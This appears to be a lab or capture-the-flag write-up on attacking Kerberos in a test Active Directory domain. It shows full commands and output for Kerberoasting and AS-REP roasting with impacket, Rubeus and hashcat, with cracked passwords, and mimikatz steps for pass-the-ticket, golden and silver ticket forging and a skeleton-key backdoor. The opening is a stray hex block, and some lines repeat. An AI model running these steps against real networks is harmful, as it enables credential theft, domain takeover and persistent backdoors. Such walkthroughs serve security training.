                             90DCAECA3A397CF69093A369321A55F0CEFBEB190D991B4B56BF4650AC260027A59AA7B501CB1328
                             7FEA72EDD37EDE807DF96D17F40E8D7C67B6D27CF92DD7CBFDD80B2AA06B0A8207A220C33B95EBC9
                             4B34807144D64DAE553A8F355D375B20EC1FD06575EFC1C22B962135C1D04B3AD3918D530F69F314
                             D7B29C6570DD4BA263C1E3DD27A740AA5EE206B4EC87EC027530EE61B8EBD95D28BA23FD92E22CF1
                             B0694DF9EC55C531DD1B827A9CF89E219F6AAE3184865E243C6EC593979B3A7140175D62758C949F
                             7C8B7834EF97FAB5896A4A7AECDDCD3C5F028A6895CD09B17D822BB46DFBB2E6D5C8B790CB5D2BB9
                             83509962B5FF4D3EC780E08B2A3494E08715EA53FCBEE1F6070A78F7E36ED89B9A314B4D2E5AFE4D
                             E77C17019D138FECE19A9F3FD9C6FFE0B5B75FF33352DF770C551035ACA3985FF761593643104A2D
                             710350E30CDD273242D42AE0CFFF8ABCE06D7CD0E8BDCF46C6294AF7034EFEF3C0C2B59ECF8FCD47
                             7F63D07F1DC003797B6CA15B02CEB6ABB2B63BC6AB5C10A41FC6D2C7376896C8EE5D58D467CA312C
                             9314D59058EC8AD94E12FFC6EACF16881F83602C2CFB5922360543C00C33
```

The Tool I prefer is GetUserSPNs 


Copied the following hash onto my local machine and ran hashcat on it.


Copied the following hash onto my local machine and ran hashcat on it.

```
impacket-GetUserSPNs 'controller.local/Machine1:Password1' -dc-ip 10.10.0.71 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 17:28:26.922527  2020-05-25 17:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 17:39:17.578393  2020-05-25 17:40:14.671872             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$4bb7fc56da872de3651769551441f5bc$d888492497eccb252631a574036b505b292f2c450bc9f9c71ad976d8650ca220754ec356dcfe45562ec51806523aa7877500c6de10f9609f11983e4e70b9e131214397940fd2b9aa45840bf304364aa27fc5ce8f004e1b351a53c5d6680f192be160b461217bb20316fb216b33875f1455f4569bb5566b83361858c7eeff19e5f265e25d465308add2af95032aa689f9ae2b66906489b5b4dc1e1271423d7cc81a01c58c1a87e13e1f6f65b012c9f7fc1cad15cabab77d4a4d4a96c22a65fa652378179391d369a001821e9ae8c72c275da7750796f7ae8e1b03851418187009704fdeae0456e7c08cedf3c022d39492bc82e0fe3bc3f4319c699185002b4d9f6dcb43c3e42306e00d8d978539a00b6dab3bfa245bd87ebdb45887b3986ade29063dd4c655fc19bfa8b3359291adc293a800a73902c215115c3922aed7c27d14915657063c995c9c325d1f326e6438074b66ceb36b718b0d181644f69b0e38c1f2e8cdee44aa0a3afbc482c4d802794b6689b5232a3391768c7e9590648317987fe842c50c8bd580867c929c5cee4ed016118a2f4e6ca1a537e113d7bf18e9e36cd9b71951989f7416d838e6cd844a8f83bd4e1198f7dd9490469634d5c7a8719e5e752aa39380a4d5fece1938131713cde1f84d69ef7acbe92c1d19ac7c284c25e2305fa50d936461ae0b1f0ae864a4048929c85899f6ca11cec4acb686642a603aa2e24a145e282eb8d34a8d3545d04204459d9be1ce27da3ae32334a685f057a37e17bc733630aaa440a7b9154301ddd7cc1207c42340c3b22a5371d7f42b0b1f455cbe3e23411df1623144e85f468d56707f9193dff50430e9014705d50f88642c8de8686d0c0e12f1061505e59b060dbfd4d339c46212b2f0d0486e41e5b455728278e4288881eec35666dcc1f1bf06e1fca9086d42c14105e97bf4309b693208caf000d802d7e260358a625edb597541f76a6a1d9972c7a67aca44d821b99940830349019dfe846073987fb8851a08a4c31c9f5e38f5425fc70d999bd323ac86ae4ef413cd62d8cfde139e20fa841c4936bc3d4d53d2e0cab11a39e7bdd3fd81c7a62bde6324cf998ebdc638adc926566fae1b65c68fb55fd49b80a4ff73c3000f75b177748cf852090bbfe407e49b79ab584aa99d4421cae66323f72d20649e3c2ad55221231a459871e91e9bddd1404e8ae4fee2e1b81d061b5d98dfa8aa68b9a73623d7869b3ec93e2b66db69667552ebd977bc6444b7432440340db1f2d1ed2ee64fcabe932db2688180cafc33688d371f1b86ac9bcb3a67290104ce4d525da43255135847d0f52cfe9b830cb23f348c943d89287307ed43f7fcf673651ed3330191373cd8e196394fa1bccb
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$1af607abe3af0835a955c3dd05db7c88$7df0be01430d03440f32257c528608ea34a219e4894b38f3d41a6aaeed8004640197f8ba89a5597c8eb455936622c03d1274e876877ffc4250e1f7693b6d22c73acc1cc6e9e6425865b46c33e6e431efea2c7b902c625893613df8321a38e51438b2443f87ba6b20a004a7390e08b1b8046e2d58129ed611e792fe8f5243c4fac07e4df67e0f91878e2d17345ba8e918bfa788fe4469bafb3ec0636f52d5c3aa44b44521d63e275438aa03ff6ab7551371d29e5f6644f85013459855a78ea8b9781d1884333b85012ed0c110e8e65dc45fa393d25b9cb2b703b3ee077351ec2b9b0b2e7187e5546460d524d83247dd8c5554f23eb4f355c0e5daab1ed4f33fb719b03439a230c73c7aaec15b062b63de26026b07177cb5db4d556b1f4d72d356ae0635efdb70e9f98babd5b2295151822f9c54cad29e742079eb5c4872c7a2f08a856ff2e07e8ffa47d0c8b475c8cc0a98d47487646163234f695c97cd22120f50e51e95cd22f02bd983e91bb93d9cc12054554909575ea0edc509bc0b05ddb05e79b370cb93ab42bd579ed18bbd2bded429b86a9bfc8fb78fffbc5748eba01ad611e13b83b5c8d9078aaab8a2d202c9420dd7b49295f3895f294e7c5abe4ac00aee5e17d7b2a99b61494ccba6c34c73fd95d4d8396888eba96c2823f41fdd19c1a1b4a4ad4c68730b1984a1756dc0b99af2a8c60cd4427e7c00191203e356e146b604f841170a58735c06765fa9d1590db06f99ff94ef27954af4afd07286659c8b8c00f849ec278e9ba9ef3c2503a52d95a90afbf0c2e59bcd430d914161a002ef82dda3b301be13d5e1fd035cc194587efdfd861cf2ec7f73192953c268cab6b0b7fa5f2fcbd8cb064ff6c6436ed8254784e837ec00def3faca7b99dc73e727c0a7426971021ed9df531cbea665eb383bb13fa6ac12095fa0b2691537a836ba1e805b961e6b7665561eb0fb6a536b30bf800c70b1c23012b3189331b9090e35a2cf718ebd2d94ec4b54d8eaeae69e9187a71e85f9fa14c4a86d0c07a64defd8c5f8adb730b45e839e163dff962fd9430267d0b3825aeca9d4b5e2b6e09805ddad912801dbd80e3be8b97e65c44e3c9bc1477f357983bf838427d597387a4c26b32c5f79c5f85abb29c49c0e7cd974742d5327140e4f0ad5313187947678b16e6c74c0f56453b46aa9627a4adf2e65c3ac2e210637852527aa5b1d110af6112d634e83f6ff1325c8040960196495b0c719e67dbe4cb0afc010379ede3e9cb48029c3d6e0c414de92a8db91e76675d5f53645fc8687cabaeb3d26ef3cabce0fbcc17f95e7226f7ad554550681366e681dd20d44ba0c18086a59133801270038a9f9c20b5a0f1b5c10f0ca166163071452
```

Copied the following hash onto my local machine and ran hashcat on it.

```
sudo nano hash
hashcat -m 13100 -a 0 hash Pass.txt                                                          
hashcat (v6.2.6) starting


OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 4299/8663 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'hash' on line 1 (impack...ord1' -dc-ip 10.10.0.71 -request): Separator unmatched
Hashfile 'hash' on line 2 (Impack...LC and its affiliated companies ): Separator unmatched
Hashfile 'hash' on line 4 (Servic...on                   Delegation ): Separator unmatched
Hashfile 'hash' on line 5 (------...--------------------  ----------): Separator unmatched
Hashfile 'hash' on line 6 (CONTRO...-25 17:46:42.467441             ): Separator unmatched
Hashfile 'hash' on line 7 (CONTRO...-25 17:40:14.671872             ): Separator unmatched
Hashfile 'hash' on line 11 ([-] CC...e file is not found. Skipping...): Separator unmatched
Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB




Dictionary cache built:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$4bb7fc56da872de3651769551441f5bc$d888492497eccb252631a574036b505b292f2c450bc9f9c71ad976d8650ca220754ec356dcfe45562ec51806523aa7877500c6de10f9609f11983e4e70b9e131214397940fd2b9aa45840bf304364aa27fc5ce8f004e1b351a53c5d6680f192be160b461217bb20316fb216b33875f1455f4569bb5566b83361858c7eeff19e5f265e25d465308add2af95032aa689f9ae2b66906489b5b4dc1e1271423d7cc81a01c58c1a87e13e1f6f65b012c9f7fc1cad15cabab77d4a4d4a96c22a65fa652378179391d369a001821e9ae8c72c275da7750796f7ae8e1b03851418187009704fdeae0456e7c08cedf3c022d39492bc82e0fe3bc3f4319c699185002b4d9f6dcb43c3e42306e00d8d978539a00b6dab3bfa245bd87ebdb45887b3986ade29063dd4c655fc19bfa8b3359291adc293a800a73902c215115c3922aed7c27d14915657063c995c9c325d1f326e6438074b66ceb36b718b0d181644f69b0e38c1f2e8cdee44aa0a3afbc482c4d802794b6689b5232a3391768c7e9590648317987fe842c50c8bd580867c929c5cee4ed016118a2f4e6ca1a537e113d7bf18e9e36cd9b71951989f7416d838e6cd844a8f83bd4e1198f7dd9490469634d5c7a8719e5e752aa39380a4d5fece1938131713cde1f84d69ef7acbe92c1d19ac7c284c25e2305fa50d936461ae0b1f0ae864a4048929c85899f6ca11cec4acb686642a603aa2e24a145e282eb8d34a8d3545d04204459d9be1ce27da3ae32334a685f057a37e17bc733630aaa440a7b9154301ddd7cc1207c42340c3b22a5371d7f42b0b1f455cbe3e23411df1623144e85f468d56707f9193dff50430e9014705d50f88642c8de8686d0c0e12f1061505e59b060dbfd4d339c46212b2f0d0486e41e5b455728278e4288881eec35666dcc1f1bf06e1fca9086d42c14105e97bf4309b693208caf000d802d7e260358a625edb597541f76a6a1d9972c7a67aca44d821b99940830349019dfe846073987fb8851a08a4c31c9f5e38f5425fc70d999bd323ac86ae4ef413cd62d8cfde139e20fa841c4936bc3d4d53d2e0cab11a39e7bdd3fd81c7a62bde6324cf998ebdc638adc926566fae1b65c68fb55fd49b80a4ff73c3000f75b177748cf852090bbfe407e49b79ab584aa99d4421cae66323f72d20649e3c2ad55221231a459871e91e9bddd1404e8ae4fee2e1b81d061b5d98dfa8aa68b9a73623d7869b3ec93e2b66db69667552ebd977bc6444b7432440340db1f2d1ed2ee64fcabe932db2688180cafc33688d371f1b86ac9bcb3a67290104ce4d525da43255135847d0f52cfe9b830cb23f348c943d89287307ed43f7fcf673651ed3330191373cd8e196394fa1bccb:MYPassword123#
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$1af607abe3af0835a955c3dd05db7c88$7df0be01430d03440f32257c528608ea34a219e4894b38f3d41a6aaeed8004640197f8ba89a5597c8eb455936622c03d1274e876877ffc4250e1f7693b6d22c73acc1cc6e9e6425865b46c33e6e431efea2c7b902c625893613df8321a38e51438b2443f87ba6b20a004a7390e08b1b8046e2d58129ed611e792fe8f5243c4fac07e4df67e0f91878e2d17345ba8e918bfa788fe4469bafb3ec0636f52d5c3aa44b44521d63e275438aa03ff6ab7551371d29e5f6644f85013459855a78ea8b9781d1884333b85012ed0c110e8e65dc45fa393d25b9cb2b703b3ee077351ec2b9b0b2e7187e5546460d524d83247dd8c5554f23eb4f355c0e5daab1ed4f33fb719b03439a230c73c7aaec15b062b63de26026b07177cb5db4d556b1f4d72d356ae0635efdb70e9f98babd5b2295151822f9c54cad29e742079eb5c4872c7a2f08a856ff2e07e8ffa47d0c8b475c8cc0a98d47487646163234f695c97cd22120f50e51e95cd22f02bd983e91bb93d9cc12054554909575ea0edc509bc0b05ddb05e79b370cb93ab42bd579ed18bbd2bded429b86a9bfc8fb78fffbc5748eba01ad611e13b83b5c8d9078aaab8a2d202c9420dd7b49295f3895f294e7c5abe4ac00aee5e17d7b2a99b61494ccba6c34c73fd95d4d8396888eba96c2823f41fdd19c1a1b4a4ad4c68730b1984a1756dc0b99af2a8c60cd4427e7c00191203e356e146b604f841170a58735c06765fa9d1590db06f99ff94ef27954af4afd07286659c8b8c00f849ec278e9ba9ef3c2503a52d95a90afbf0c2e59bcd430d914161a002ef82dda3b301be13d5e1fd035cc194587efdfd861cf2ec7f73192953c268cab6b0b7fa5f2fcbd8cb064ff6c6436ed8254784e837ec00def3faca7b99dc73e727c0a7426971021ed9df531cbea665eb383bb13fa6ac12095fa0b2691537a836ba1e805b961e6b7665561eb0fb6a536b30bf800c70b1c23012b3189331b9090e35a2cf718ebd2d94ec4b54d8eaeae69e9187a71e85f9fa14c4a86d0c07a64defd8c5f8adb730b45e839e163dff962fd9430267d0b3825aeca9d4b5e2b6e09805ddad912801dbd80e3be8b97e65c44e3c9bc1477f357983bf838427d597387a4c26b32c5f79c5f85abb29c49c0e7cd974742d5327140e4f0ad5313187947678b16e6c74c0f56453b46aa9627a4adf2e65c3ac2e210637852527aa5b1d110af6112d634e83f6ff1325c8040960196495b0c719e67dbe4cb0afc010379ede3e9cb48029c3d6e0c414de92a8db91e76675d5f53645fc8687cabaeb3d26ef3cabce0fbcc17f95e7226f7ad554550681366e681dd20d44ba0c18086a59133801270038a9f9c20b5a0f1b5c10f0ca166163071452:Summer2020
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hash
Time.Started.....: Sat Sep 13 10:54:23 2025 (0 secs)
Time.Estimated...: Sat Sep 13 10:54:23 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    55130 H/s (0.44ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 2480/2480 (100.00%)
Rejected.........: 0/2480 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 16%

Started: Sat Sep 13 10:54:00 2025
Stopped: Sat Sep 13 10:54:24 2025
```

Retrieved passwords for both kerberos tickets.

SQLSERVICE:MYPassword123#
HTTPSERVICE:Summer2020


## AS_REP Roasting

Utilizing Rubeus.exe to perform AS_REP Roasting, is very similiar to Kerberoasting as it dumps the hashes of user accounts, but it only dumps users on the domain, which have pre-authentification disabled.
So in other words they dont have to be service accounts.
Running the following command will immediatly provide us with hashes since Rubeus.exe will dump them immediatly.

```
Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local 

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2 
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd94:c068:d2d3:3b98%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:D63A336514511D76743C84FE9B0A6323$B34772FB4413
      1FE2491DDFAC47ECCC29D460BE565912C515233BB4D5D5FE585C5620AA8046B55573854E3E1B350D
      1716E65814AEADD374D41EF729BC389A65C7620622F57A189BA2EBDE5802AB18403D06ED8F80DB2C
      05905DAA379BEB1F4A88361EE13D92B6C5A784E6B0DA81DDF3FC84E846B45EE7864148A7C24464FB
      FD4051347777A1AF9466EB2DFDA741445E81CBCDC5FADB7CC8B1F201EBBFAEB81D7FE9A95B340653
      7F08A66445FECDCE7A57294518E54CDF50D6FC19FC51D6E5DE4329A4407A8C4C98B40DFD07DABEE2
      82F7FC945D3F86D217748476BBA472E85530153EB3E3635E80D11E5A575E7400DA33704AD5D7

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::cd94:c068:d2d3:3b98%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:94A039CAC4572D6B14D5762AF79F1DF8$C8CD16F7A9EEE
      92866159DD9D62C70CCCA48AFAA93BC026C5A20DD7404FEFCC106A4B65B3E2D3CF268C01963F2041
      9B2BA63F683FCBD51AD1CDD65694BCF66CB2A2182079C0D43A9C6CFAA279D65E4A2F14B564E77BA8
      6C1D67FD8EB2D4A94815A6AE33DEDE9838902A3A7A0E11A9673C52A8D860282BBA4EF73F7E64598A
      80EF995AF531A8872B173AFB102F1C7A56D4B447A9B5208283A8A0E81A450227733069865A927642
      4992B7428468359043EBD4A445F9098629582E321AE4474B4C06F6B74DC5FED5A8DC4CFAB1FAFD7F
      953D635CF429EB52771A16E983AFD42D52114F899F35F68BAC94CB3B28D7A95BFB92CFE9A53
```

To prompt them correctly inside an .txt file we copy it inside them generically and then prompt the following command
to order them correctly in, otherwise hashcat wont work.

```
cat admin2.txt | tr -d " \t\n\r"
cat user3.txt | tr -d " \t\n\r"
```

Don't forget to add 23$ manually after $krb5asrep$

Running hashcat utilizing the following command provided us with User3:Password3

```
hashcat -m 18200 user3.txt Pass.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 4299/8663 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5asrep$23$User3@CONTROLLER.local:94a039cac4572d6b14d5762af79f1df8$c8cd16f7a9eee92866159dd9d62c70ccca48afaa93bc026c5a20dd7404fefcc106a4b65b3e2d3cf268c01963f20419b2ba63f683fcbd51ad1cdd65694bcf66cb2a2182079c0d43a9c6cfaa279d65e4a2f14b564e77ba86c1d67fd8eb2d4a94815a6ae33dede9838902a3a7a0e11a9673c52a8d860282bba4ef73f7e64598a80ef995af531a8872b173afb102f1c7a56d4b447a9b5208283a8a0e81a450227733069865a9276424992b7428468359043ebd4a445f9098629582e321ae4474b4c06f6b74dc5fed5a8dc4cfab1fafd7f953d635cf429eb52771a16e983afd42d52114f899f35f68bac94cb3b28d7a95bfb92cfe9a53:Password3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$User3@CONTROLLER.local:94a039cac4572d...fe9a53
Time.Started.....: Sat Sep 13 11:57:01 2025 (0 secs)
Time.Estimated...: Sat Sep 13 11:57:01 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   101.7 kH/s (0.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 12%

Started: Sat Sep 13 11:57:00 2025
Stopped: Sat Sep 13 11:57:03 2025
```

Admin2:P@$$W0rd2

```
hashcat -m 18200 admin2.txt Pass.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-AMD Ryzen 7 4800H with Radeon Graphics, 4299/8663 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: Pass.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5asrep$23$Admin2@CONTROLLER.local:d63a336514511d76743c84fe9b0a6323$b34772fb44131fe2491ddfac47eccc29d460be565912c515233bb4d5d5fe585c5620aa8046b55573854e3e1b350d1716e65814aeadd374d41ef729bc389a65c7620622f57a189ba2ebde5802ab18403d06ed8f80db2c05905daa379beb1f4a88361ee13d92b6c5a784e6b0da81ddf3fc84e846b45ee7864148a7c24464fbfd4051347777a1af9466eb2dfda741445e81cbcdc5fadb7cc8b1f201ebbfaeb81d7fe9a95b3406537f08a66445fecdce7a57294518e54cdf50d6fc19fc51d6e5de4329a4407a8c4c98b40dfd07dabee282f7fc945d3f86d217748476bba472e85530153eb3e3635e80d11e5a575e7400da33704ad5d7:P@$$W0rd2
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$Admin2@CONTROLLER.local:d63a336514511...4ad5d7
Time.Started.....: Sat Sep 13 11:58:03 2025 (0 secs)
Time.Estimated...: Sat Sep 13 11:58:03 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Pass.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   278.3 kH/s (0.57ms) @ Accel:550 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1240/1240 (100.00%)
Rejected.........: 0/1240 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 24%

Started: Sat Sep 13 11:58:02 2025
Stopped: Sat Sep 13 11:58:05 2025
```

## Pass the Ticket Attack Mimikatz

This tool can dump user credentials inside an active directory network and we will be using it
to dump a TGT from LSASS Memory.

```
mimikatz.exe
privilege::debug
sekurlsa::tickets
```

First of all I rechecked if I got the rights to dump TGT's from the lsass memory. Than I ran the command which
exports those tickets into my directory.

The next step is to take one of the tickets and impersonate it, in this case I decided to go for the Administrator one

In mimikatz I prompted the following command:

```
kerberos:ptt [0;48887]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi

* File: '[0;48887]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
```

This cached and impersonated the ticket. 

Going into my windows cli again and prompting 

```
klist
```

verified that I sucessfully impersonated the tgt by listing our cached tickets.

## Golden/Silver Ticket Attacks Mimikatz

Golden Tickets have access to any Kerberos service, while Silver Tickets are limited to the the service
that is targeted, although they are more recommended to utilize since they are more stealthier.

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is.
A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients.
If you impersonate this account and create a goldenticket form the KRBTGT you give yourself the ability to create a 
service ticket for anything you want.


Utilizing the following command should dump the hash as well as the SID needed to create a golden ticket.
To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a 
service account such as the SQLService account.

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

Utilizing the following command we can create a golden/silver ticket.

```
Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502
```
Output:

```
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502 
User      : Administrator                                                         
Domain    : controller.local (CONTROLLER)                                         
SID       : S-1-5-21-432953485-3795405108-1502158860                              
User Id   : 502                                                                   
Groups Id : *513 512 520 518 519                                                  
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt                        
Lifetime  : 9/13/2025 10:57:12 AM ; 9/11/2035 10:57:12 AM ; 9/11/2035 10:57:12 AM 
-> Ticket : ticket.kirbi                                                          
                                                                                  
 * PAC generated                                                                  
 * PAC signed                                                                     
 * EncTicketPart generated                                                        
 * EncTicketPart encrypted                                                        
 * KrbCred generated                                                              
                                                                                  
Final Ticket Saved to file !
```

Use the golden / silver ticket to access other machines

Utilizing the following command will open a new elevated command prompt with the given ticket.

```
mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6A50643B8
```

## Kerberos Backdoors 

The skeleton key works by abusing the AS-REQ encrypted timestamps as I said above, the timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest

Utilizing mimikatz we can install the skeleton key.

```
misc::skeleton
```

Accessing the forest

The default credentials will be: "mimikatz"

example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password

example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.

```

```
